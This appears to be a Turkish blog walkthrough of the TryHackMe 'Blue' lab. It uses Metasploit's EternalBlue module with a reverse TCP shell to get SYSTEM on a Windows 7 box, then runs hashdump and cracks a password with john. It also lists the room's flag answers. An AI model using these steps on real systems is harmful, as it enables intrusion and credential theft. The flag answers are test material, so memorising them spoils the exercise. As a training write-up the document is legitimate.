---
title: "TryHackMe: Blue"
date: 2025-01-05T17:08:30-04:00
categories:
  - tryhackme
tags:
  - metasploit
  - buffer overflow
  - nmap
---

![Blue](/assets/images/tryhackme-blue/blue.gif){: .center }

Merhaba, [bu odada](https://tryhackme.com/r/room/blue) EternalBlue [MS17-010](https://learn.microsoft.com/tr-tr/security-updates/securitybulletins/2017/ms17-010) ya da CVE-2017-0144 güvnelik açığını anlayıp istismar ederek soruları yanıtlamamız bekleniyor. Bu açık *bellek taşması*

Bu oda giriş seviyesinde bir oda ve de bir video ile odadaki soruların yanıtları sağlanmış. Lakin benim niyetim bu basit odayı kullarak temel konseptleri ve kavramları yazmak, mümkünse Türkçeleştirmek ve daha ileri görevler istenen odalar için bir literatür oluşturmak.

EternalBlue Microsoft'un SMBv1 protokülnde yer alan bir güvenlk açığını hedefliyor ve WannaCry gibi meşhur fidye yazılımlarda da bu açıklıktan faydalanılmış. 

SMB protokolü, *istemci-sunucu* modeline dayanan ve ağ üzerinden dosya, cihaz ve paylaşılan klasörlere erişim için kullanılan bir protokol.

![SMB](/assets/images/tryhackme-blue/smb.webp){: style="width:400px; height:400px; display:block; margin:auto;"}

Neyse, biz odadaki görevlere başlayalım, konsept ve kavramlara yeri geldikçe değinebiliriz.

## Keşfetme ve bilgi toplama
`nmap -sV -sC --script vuln -oN blue.nmap HEDEF_IP`

Nmap (network mapper) bir ağdaki cihazları, açık portları ve çalışan servisleri tespit etmek için kullanılan bir ağ tarama aracıdır. Böylece yukarıdaki komut yordamıyla belirttiğiniz makinede güvenlik zafiyeti taraması yapabilirsiniz. 

Parametreleri kısaca açıklayacak isek:

* **-sV** açıok olan protlarda sunulan servislerin versiyonları
* **-sC** [betik](https://www.nisanyansozluk.com/kelime/betik)[^1] kodlarını çalıştırmak için
* **--script vuln** güvenlik açıklarını tespit etmek için yazılı
* **-oN blue.nmap** sonucu nmap formatında blue.nmap dosyasına kaydetmek için

Böylece hedef makinedeki açık portları ve bu portlarda çalışan servisleri tespit edebilirsiniz. Ardından bu servislerin versiyon bilgileri ile olası güvenlik zafiyetlerini tarayıp raporluyorsunuz.
![alt text](/assets/images/tryhackme-blue/nmap.png){: .center}

### Soru 1: How many ports are open with a port number under 1000?

Yukarıdaki görselde nmap komutunun çıktısını görebilirsiniz. 135, 139 ve 445 portları açık. **3**


### Soru 2: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
Uzaktan kod çalıştırma zafiyeti olduğunu görebilirsiniz **ms17-010** (yıl 2017, yayınlanan 10. bülten) kodlu.


## Erişim kazanma

### Soru 3: Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Yukarıda hedef makinenin ms17-010 zafiyeti olduğunu keşfetmiştik. Şimdi metasploit çerçevesinde bulunan açıklık istismarı modüllerinden faydalanacağız. Metasploiti başlattıktan sonra `search ms17` komutu ile arama yapabilirsiniz. 
`exploit/windows/smb/ms17_010_eternalblue`modülünü kullacağız uzaktan kod çalıştırmak için.

### Soru 4: Show options and set the one required value. What is the name of this value? (All caps for submission)

`show options` komutu ile ilgili modülün konfigürasyonlarını görebiliriz. Bu saldırıdaki hedefimizin hedef makine ile reverse shell bağlantısı[^2] kurmak olduğunu anımsar isek LHOST değerinin kendi makinemizin IP adresini içerirken LPORT değerinin bağlantıyı gerçekleyeceğimiz port değeri olması gerektiğini çıkarabiliriz.

Burada konfigüre edilmesi gereken bir diğer parametre RHOST ki bu da hedef makinen IP adresini içermeli. (Yanıt: **RHOST**)

`set rhost HEDEF_IP`

## İşlev kodu çalıştırma
Bu odada ilgili görev için kullanılabilecek bir işlev kodu sağlanmış ve bu işlev kodunu da aşağıdaki komut ile kullanabilirsiniz: 
`set payload windows/x64/shell/reverse_tcp`

Ardından `run` komutunu kullanarak hedef makineniz ile geriye bağlantılı kabuk (zannederim en az kulak tırmalayan versiyonu) kurabilirsiniz. 

## Ayrıcalık yükseltme
Artık hedef makine ile bağlantıyı kurduk. Şimdi metasploit modüllerini kullanarak ayrıcalıklarımızı yükseltmeye çalışacağız. Zaten bir sonraki soruda da tam olarak hangi modülü kullanacağımızı soruyor.

### Soru 5: If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

Bu soru için veerilen ipucuna da bakarak kullanacağımız modülü bulabiliriz:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

```

### Soru 6: Select this (use MODULE_PATH). Show options, what option are we required to change?

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to recei
                                       ve the connection
   LHOST                     no        IP of host that will receive the connec
                                       tion from the payload (Will try to auto
                                        detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

Gördüğünüz gibi **session** parametresini ayarlamamız gerekecek. Böylece modülümüzün koşacağı oturumu belirtmiş olacağız. Sahip olduğumuz oturumlara bakalım şimdi:

 ```console
 msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information             Connection
  --  ----  ----               -----------             ----------
  1         shell x64/windows  Shell Banner: Microsof  10.10.74.121:4444 -> 10
                               t Windows [Version 6.1  .10.150.253:49176 (10.1
                               .7601] -----            0.150.253)

``` 

Böylece modülümüze oturum 1'de koşacağını söyleyeceğiz: `set session 1` ve ardından çalıştırabiliriz `run`:

```console
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.74.121:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.150.253
[*] Meterpreter session 2 opened (10.10.74.121:4433 -> 10.10.150.253:49209) at 2025-02-06 08:22:01 +0000
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         shell x64/windows     Shell Banner: Microso  10.10.74.121:4444 ->
                                  ft Windows [Version 6  10.10.150.253:49176 (
                                  .1.7601] -----         10.10.150.253)
  2         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.10.74.121:4433 ->
            ows                    JON-PC                10.10.150.253:49209 (
                                                         10.10.150.253)

msf6 post(multi/manage/shell_to_meterpreter) > 
```

Ardından 2. oturumu `sessions -i 2` komutu ile başlatabiliriz ve meterpreter shelline erişebiliriz.

### Soru 7: Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 


```console
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 2240 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

## Parola kırma

### Soru 8: Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 


```console
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```
**jon**

### Soru 8: Copy this password hash to a file and research how to crack it. What is the cracked password?

Öncelikle hashdump çalıştırarak elde ettiğimiz hash formatı hakkında bir iki kelâm etmek gerekecek.

`Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::`

Burada gördüğünüz linux `/etc/shadow` klasöründe tutulan parola formatı gibi. Bileşenleri açıklarsak:
* Jon: kullanıcı adı
* 1000: kullanıcının sistemdeki kimlik numarası (1000 windows'ta genelde standart kullanıcıyı ifade ediyor)
* aad3b435b51404eeaad3b435b51404ee: LM hash
* ffb43f0de35be4d9917ac0cc8ad57f8d: NT hash

Öz değerinden parola bulmanın detaylarına [HashCracking](2025-01-05-tryhackme-cracking-hashes.md) yazısında değinmiştim. Bu sebepten doğrudan yanıta bakabiliriz burada:  **alqfna22**

```console
root@ip-10-10-74-121:~# john --format=NT  --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)
1g 0:00:00:01 DONE (2025-02-06 08:41) 0.9708g/s 9903Kp/s 9903Kc/s 9903KC/s alr1979..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

## BAyrakları bulma

### Soru 9: Flag1? This flag can be found at the system root. 

C dizini altında flag1.txt dosyasına ulaşabilrisiniz.
**flag{access_the_machine}**

### Soru 10: Flag2? This flag can be found at the location where passwords are stored within Windows.


ikinci bayrak için C:\windows\system32\config dizini
**flag{sam_database_elevated_access}**

### Soru 11: flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 


Üçüncü bayrağı bulmak için: 
```console 
meterpreter > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 19:26:36 +0000
c:\Windows\System32\config\flag2.txt  34            2019-03-17 19:32:48 +0000
c:\flag1.txt                          24            2019-03-17 19:27:21 +0000

meterpreter > 
```
**flag{admin_documents_can_be_valuable}**


[^1] Script zamanında betik olarak Türkçeleştirilmiş. TDK'da betik şeklinde geçiyor, tatlıya süçüg demediğimiz gibi *komut dizini dosyası?* gibi bir şeye de betik dememek daha hoş olacak sanki.
[^2] *Geriye bağlantılı kabuk?* belki shell kavramına dokunmadan Türkçeleştirmeli, keza kulak tırmalıyor. 